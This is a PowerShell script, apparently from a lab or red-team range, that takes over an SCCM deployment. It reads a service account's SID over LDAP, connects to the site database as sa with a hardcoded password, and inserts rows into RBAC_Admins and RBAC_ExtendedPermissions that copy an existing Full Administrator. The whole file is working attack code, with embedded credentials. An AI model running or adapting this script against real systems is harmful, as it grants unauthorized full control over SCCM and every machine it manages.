# Add RANGE\svc_sccm as Full Administrator via DB (Takeover-1 primitive) — analyst_t1 (ws01 ATTACK)
$ErrorActionPreference = 'Stop'

# 1) Get svc_sccm objectSid via LDAP (bind as svc_sccm)
Write-Output '=== [1] LDAP: svc_sccm objectSid ==='
$path = 'LDAP://dc03.range.local/DC=range,DC=local'
$searcher = New-Object System.DirectoryServices.DirectorySearcher
$searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry($path, 'RANGE\svc_sccm', 's3rv1c3_SCCM!')
$searcher.Filter = '(sAMAccountName=svc_sccm)'
$searcher.PropertiesToLoad.AddRange(@('objectSid','sAMAccountName'))
$res = $searcher.FindOne()
if (-not $res) { throw 'svc_sccm not found in LDAP' }
$sidBytes = [byte[]]$res.Properties['objectSid'][0]
$sidHex = '0x' + (($sidBytes | ForEach-Object { $_.ToString('X2') }) -join '')
Write-Output ("  sAMAccountName=" + $res.Properties['sAMAccountName'])
Write-Output ("  SID hex=" + $sidHex)

# 2) Mirror the working Full Admin (16777217 = MBR02\vagrant) permission rows
Write-Output '=== [2] Existing Full Admin RBAC_ExtendedPermissions (template) ==='
$conn = New-Object System.Data.Odbc.OdbcConnection("Driver={SQL Server};Server=mbr02.range.local,1433;Database=CM_CAD;Uid=sa;Pwd=s@_P@ssw0rd!L@b!;Encrypt=no;TrustServerCertificate=yes")
$conn.Open()
$cmd = $conn.CreateCommand()
$cmd.CommandText = "SELECT AdminID, RoleID, ScopeID, ScopeTypeID FROM RBAC_ExtendedPermissions WHERE AdminID=16777217"
$rdr = $cmd.ExecuteReader()
$rows = @()
while ($rdr.Read()) { $rows += ,@($rdr[0], $rdr[1], $rdr[2], $rdr[3]) }
$rdr.Close()
foreach ($r in $rows) { Write-Output ("  " + ($r -join ' | ')) }
if ($rows.Count -eq 0) { throw 'No template rows found' }

# 3) Insert svc_sccm as admin
Write-Output '=== [3] Insert svc_sccm into RBAC_Admins ==='
$cmd.CommandText = "INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) VALUES ($sidHex,'RANGE\svc_sccm',0,0,'svc_sccm',GETDATE(),'svc_sccm',GETDATE(),'CAD')"
$cmd.ExecuteNonQuery() | Out-Null

$cmd.CommandText = "SELECT AdminID FROM RBAC_Admins WHERE LogonName='RANGE\svc_sccm'"
$adminId = [int]$cmd.ExecuteScalar()
Write-Output ("  new AdminID=" + $adminId)

# 4) Insert permission rows mirroring the Full Admin template
Write-Output '=== [4] Insert RBAC_ExtendedPermissions for svc_sccm ==='
foreach ($r in $rows) {
  $role = $r[1]; $scope = $r[2]; $stype = $r[3]
  $cmd.CommandText = "INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ($adminId,'$role','$scope','$stype')"
  $cmd.ExecuteNonQuery() | Out-Null
  Write-Output ("  inserted AdminID=$adminId Role=$role Scope=$scope Type=$stype")
}
$conn.Close()
Write-Output 'ADDADMIN_DONE'
